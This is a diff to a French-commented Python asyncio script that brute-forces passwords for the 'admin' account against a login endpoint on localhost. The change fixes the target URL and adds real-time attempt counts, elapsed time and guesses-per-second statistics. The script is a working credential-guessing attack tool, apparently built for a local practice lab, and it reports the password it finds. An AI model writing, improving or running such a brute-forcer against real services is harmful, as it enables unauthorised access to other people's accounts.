@@ -7,12 +7,13 @@ import asyncio
 import sys # pour faire joli dans le terminal
 import string
 import itertools # Générer combinaisons
+import time
 
 CHARGEMENT = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
 
 # OPTIMISATION : On passe l'argument 'client' pour réutiliser la session TCP permanente
 async def send_request(client: httpx.AsyncClient, username: str, password: str) -> int: # renvoie un entier
-    url = "http://127.0.0:8000/login"
+    url = "http://127.0.0.1:8000/login"
     donnees = {                                                                                  
         "username": username,                                                    
         "password": password                                                           
@@ -51,6 +52,9 @@ async def main():
     compteur_animation = 0
     tentatives = 0
     
+    # Utilisation de perf_counter pour une précision chirurgicale sur les stats de temps
+    temps_debut = time.perf_counter()
+    
     # LE USERNAME EST CONNU
     USERNAME_CONNU = "admin"
     
@@ -73,11 +77,16 @@ async def main():
                 # Gestion de l'animation graphique sur une seule ligne
                 symbole = CHARGEMENT[compteur_animation % len(CHARGEMENT)]
                 tentatives += 1
-            
-                # On affiche le mot de passe en cours de test dans l'animation
-                sys.stdout.write(f"\r{symbole} Test : [{password_actuel}]... Tentative n°{tentatives}")
-                sys.stdout.flush()
                 compteur_animation += 1
+                
+                # CALCUL STATISTIQUES EN TEMPS RÉEL
+                temps_actuel = time.perf_counter() - temps_debut
+                # Évite la division par zéro au premier lancement
+                vitesse = tentatives / temps_actuel if temps_actuel > 0 else 0
+            
+                # On affiche le mot de passe, les tentatives, le temps écoulé et la vitesse dans l'animation
+                sys.stdout.write(f"\r{symbole} [{password_actuel}] | Tentatives: {tentatives} | Temps: {temps_actuel:.1f}s | Vitesse: {int(vitesse)} mots/s")
+                sys.stdout.flush()
                 
                 # Exécution de la requête réseau avec le client persistant
                 statut = await send_request(client=client, username=USERNAME_CONNU, password=password_actuel)
@@ -88,14 +97,20 @@ async def main():
                 
                 # Analyse et traitement des statuts HTTP reçus
                 if statut == 200:      
-                    sys.stdout.write("\r" + " " * 60 + "\r")  # Efface l'animation courante                                                                    
+                    # On recalcule le temps final exact juste avant l'arrêt complet
+                    temps_total = time.perf_counter() - temps_debut
+                    
+                    # Augmentation de la taille de l'effacement (90 espaces) pour couvrir la longue ligne de statistiques
+                    sys.stdout.write("\r" + " " * 90 + "\r")                                                                     
                     print(f"✅ tentatives : {tentatives}")
+                    print(f"⏱️ Temps total : {temps_total:.2f} secondes")
+                    print(f"📊 Vitesse finale : {int(tentatives / temps_total)} mots/seconde")
                     print(f"👤 Login : {USERNAME_CONNU}")
                     print(f"🔑 MDP   : {password_actuel}")
                     break # Succès complet : on coupe la boucle
                   
                 elif statut == 404: 
-                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    sys.stdout.write("\r" + " " * 90 + "\r")
                     print('❌ Erreur 404 : L\'adresse cible est introuvable.')                                                                         
                     break                 
                     
@@ -103,17 +118,17 @@ async def main():
                     pass # Identifiants incorrects : l'animation continue au prochain mot de passe          
                     
                 elif statut == 403:
-                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    sys.stdout.write("\r" + " " * 90 + "\r")
                     print('🔒 Erreur 403 : Accès interdit (IP bloquée ou pare-feu)')
                     break                                      
                     
                 else:                                                                                        
-                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    sys.stdout.write("\r" + " " * 90 + "\r")
                     print(f"⚠️ Autre code reçu : {statut}")   
                     await asyncio.sleep(2)
                               
             except Exception as e:
-                sys.stdout.write("\r" + " " * 60 + "\r")
+                sys.stdout.write("\r" + " " * 90 + "\r")
                 print(f"Erreur réseau détectée : {e}")
                 await asyncio.sleep(10)
 
